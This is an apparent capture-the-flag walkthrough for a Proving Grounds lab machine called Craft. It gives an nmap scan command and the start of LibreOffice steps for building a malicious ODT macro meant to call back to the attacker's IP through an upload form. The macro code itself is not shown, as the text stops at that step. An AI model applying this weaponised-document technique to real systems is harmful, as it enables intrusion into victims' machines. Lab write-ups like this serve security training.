# PG Craft
## ODT File Upload, xampp\htdocs
## nmap
```
nmap -Pn -sCV — open -p- — min-rate 10000 -oN nmap_open.txt 192.168.249.169
```
## Apache (80) 
```
ODT File Upload form
```
## Create the malicious ODT file
```
Open Libreoffice > Tools > Macros > Organize Macros > Basic
Click “Untitled 1” > “New” and name the file Offsec1 and click “OK”




between “Sub Main” and “End Sub” (which will perform an HTTP request to our IP). If we are hosting on port 80 and the port is open the command should execute:
```
